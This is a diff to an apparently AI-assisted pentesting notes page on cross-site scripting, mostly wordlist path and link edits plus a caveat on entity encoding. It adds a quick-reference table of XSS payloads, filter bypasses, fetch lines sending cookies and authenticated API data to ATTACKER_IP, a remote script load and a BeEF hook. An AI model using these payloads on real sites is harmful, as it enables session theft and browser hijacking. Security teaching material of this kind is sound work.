@@ -17,7 +17,7 @@ Web app fails to sanitize user input, allowing injection of JavaScript that exec
 | `XSStrike` | Smart XSS scanner — context-aware payload generation |
 | `dalfox` | Fast XSS scanner — parameter analysis + PoC generation |
 | `xsshunter` | Blind XSS callback service — captures cookies/DOM/screenshots |
-| `Burp Suite` | Intercept, test, and automate XSS discovery |
+| [[Burpsuite]] | Intercept, test, and automate XSS discovery |
 | `BeEF` | Browser exploitation framework — post-XSS browser control |
 
 ---
@@ -191,7 +191,7 @@ data:text/html,<script>alert(1)</script>
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=xss_test' -fs 0 -mc 200
 
 # Fuzz with payloads against known parameter
-ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0
+ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0
 ```
 
 ---
@@ -237,7 +237,11 @@ Filter strips `<script>` once:
 %3Cscript%3Ealert(1)%3C/script%3E
 
 <!-- HTML entities -->
+<!-- CAVEAT: entity-encoding the TAG BRACKETS only works if the app DOUBLE-decodes
+     (HTML-decodes before re-inserting/re-parsing). In a plain HTML-body sink the
+     parser renders &#x3C; as literal "<" text — inert, no execution. -->
 &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<!-- This one DOES work: in ATTRIBUTE context, entities are decoded, so onerror runs alert -->
 <img src=x onerror="&#x61;lert(1)">
 
 <!-- Unicode -->
@@ -713,16 +717,16 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ 
 
 ```bash
 # Fuzz with XSS payloads
-ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0
+ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0
 
 # Alternative wordlists
-/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
-/usr/share/seclists/Fuzzing/XSS/XSS-RSNAKE.txt
+/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt
+/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-RSNAKE.txt
 ```
 
 ### Tools
 
-- [[Burp Suite]] - Manual testing, Repeater, Scanner, DOM Invader
+- [[Burpsuite]] - Manual testing, Repeater, Scanner, DOM Invader
 - [XSStrike](https://github.com/s0md3v/XSStrike) - Context-aware fuzzer with payload evaluation
 - [DalFox](https://github.com/hahwul/dalfox) - Fast scanner, blind XSS support
 - [XSS Hunter](https://xsshunter.trufflesecurity.com/) - Blind XSS tracking with screenshots
@@ -732,8 +736,8 @@ ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt:FUZZ -u 'http://targe
 - [BeEF](https://github.com/beefproject/beef) - Browser Exploitation Framework — hook browsers, run post-XSS modules
 
 **Wordlists:**
-- [XSS-BruteLogic.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/XSS-BruteLogic.txt)
-- [XSS-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/XSS-Jhaddix.txt)
+- [XSS-BruteLogic.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt)
+- [XSS-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt)
 - [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
 - [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 
@@ -809,11 +813,11 @@ Understanding defenses helps you spot gaps:
 **Modules:**
 - [[File Upload Attacks]] - Upload HTML/SVG with XSS payloads
 - [[Web Attacks]] - CSRF, other injection types
-- [[Session Security]] - Session hijacking post-XSS
+- [[JWT Attacks]] - Token/session theft and tampering post-XSS
 - [[SQL Injection]] - Sometimes chainable with XSS
 
 **Tools:**
-- [[Burp Suite]] - Manual testing
+- [[Burpsuite]] - Manual testing
 - [[ffuf]] - Fuzzing
 - [[gobuster]] - Enumeration
 
@@ -825,6 +829,29 @@ Understanding defenses helps you spot gaps:
 
 ---
 
+## Quick Reference
+
+| Goal | Payload / Command |
+|---|---|
+| Basic PoC | `<script>alert(document.domain)</script>` |
+| Tag filtered, need event handler | `<img src=x onerror=alert(1)>` / `<svg onload=alert(1)>` |
+| Check reflection | `curl -s "http://target.com/search?q=UNIQUE_STRING" \| grep UNIQUE_STRING` |
+| Attribute-context breakout | `" autofocus onfocus="alert(1)` |
+| JS-string-context breakout | `';alert(1);//` |
+| No parens (filter bypass) | `<script>onerror=alert;throw 1</script>` |
+| No space (filter bypass) | `<svg/onload=alert(1)>` |
+| Steal cookie (invisible) | `fetch('http://ATTACKER_IP/steal?c='+document.cookie)` |
+| Bypass HttpOnly — act as user | `fetch('/api/admin/users',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP/?data='+btoa(d)))` |
+| Blind XSS callback | `<script src="http://ATTACKER_IP/xss.js"></script>` |
+| Fuzz for reflective params | `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=xss_test' -fs 0 -mc 200` |
+| Fuzz payloads | `ffuf -w XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -fs 0` |
+| Find DOM sinks in JS | `curl -s http://target.com/app.js \| grep -iE '(innerHTML\|document\.write\|eval\(\|\.html\()'` |
+| CSP check | `curl -sI http://target.com \| grep -i content-security-policy` |
+| Hook browser (BeEF) | `<script src="http://<AttackerIP>:3000/hook.js"></script>` |
+| SVG upload XSS | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>` |
+
+---
+
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
